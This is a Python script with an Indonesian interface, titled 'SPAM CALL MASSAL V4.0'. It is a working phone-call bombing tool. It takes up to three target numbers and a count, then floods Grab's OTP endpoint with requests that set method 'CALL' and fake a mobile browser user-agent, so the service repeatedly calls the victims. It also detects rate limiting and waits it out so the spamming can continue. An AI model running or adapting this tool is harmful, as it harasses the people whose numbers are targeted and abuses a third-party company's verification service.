#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""

try:
	import os, requests, time, json
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL MASSAL V4.0%s
 ,_     _‚
 |\\\___//|	%sAuthor: KANG-NEWBIE%s
 |=6   6=|	%sContact: https://t.me/kang_nuubi%s
 \=._Y_.=/	%sGithub: https://github.com/KANG-NEWBIE%s
  )  `  (    ,	%sTEAM: CRABS (t.me/CRABS_ID)%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silahkan hubungi saya"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] NUM TARGET1 => %s"%(w))
no2 = input("%s[?] NUM TARGET2 => %s"%(g,w))
no3 = input("%s[?] NUM TARGET3 => %s"%(g,w))
jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))

try:
	henti_tanya=False
	forcecon=0
	print("\n%s[-] RESULT:%s"%(r,w));time.sleep(1)
	for i in range(jlmh):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in no1,no2,no3:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f"[!] Sepertinya {r}TARGET{cout}{w} terkena limit, cobalah beberapa saat lagi")
				if henti_tanya == True:
					pass
				else:
					pil=input("[?] Ingin menjeda program selama 60 detik (1 menit) [y/n] ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r[!] Jeda {60-(x+1)} detik",flush=True)
								time.sleep(1)
							except: break
						print("\n[OK] Lanjutss")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f"[!] {c}tekan F untuk menghentikan pertanyaan{w}")
			elif "challengeID" in r1.text:
				print(f"[+] {c}TARGET{cout} {g}BERHASIL{w}")
			else:
				print(f"[-] {c}TARGET{cout} {r}GAGAL{w}")
			time.sleep(10)
			cout+=1
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%ssampai jumpa gan..."%(c))
